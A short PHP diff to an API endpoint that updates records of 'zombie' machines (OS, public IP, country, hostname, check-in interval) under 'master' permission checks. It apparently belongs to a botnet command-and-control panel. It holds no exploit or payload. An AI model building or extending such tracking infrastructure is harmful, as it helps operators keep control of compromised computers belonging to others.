@@ -19,7 +19,7 @@ include_once 'config/database.php';
 include_once 'objects/zombie.php';
 
 // auxilar functions
-include_once 'aux/check_permission.php';
+include_once 'aux_functions/check_permission.php';
  
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
@@ -39,7 +39,7 @@ if($jwt){
         $requested_by = $decoded->data->username;
         $to_update = $data->username;
         // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
-        check_permission($requested_by, $to_update);
+        check_master_permissions($requested_by, $to_update);
 
         // get database connection
         $database = new Database();
@@ -52,26 +52,11 @@ if($jwt){
         $zombie->username = $data->username;
         $zombie->os = $data->os;
         $zombie->current_public_ip = $data->current_public_ip;
+        $zombie->current_country = $data->current_country;
         $zombie->current_hostname = $data->current_hostname;
-        $zombie->current_mac_addr = $data->current_mac_addr;
         $zombie->refresh_secs = $data->refresh_secs;
         // update the zombie record
         if($zombie->update()){
-            // we need to re-generate jwt because user details might be different
-            // $token = array(
-            //     "iat" => $issued_at,
-            //     "exp" => $expiration_time,
-            //     "iss" => $issuer,
-            //     "data" => array(
-            //         //"id" => $zombie->id,
-            //         "username" => $zombie->username,
-            //         "current_public_ip" => $zombie->current_public_ip,
-            //         "current_hostname" => $zombie->current_hostname,
-            //         "current_mac_addr" => $zombie->current_mac_addr,
-            //         "refresh_secs" => $zombie->refresh_secs
-            //     )
-            // );
-            // $jwt = JWT::encode($token, $key);
             
             // set response code
             http_response_code(200);
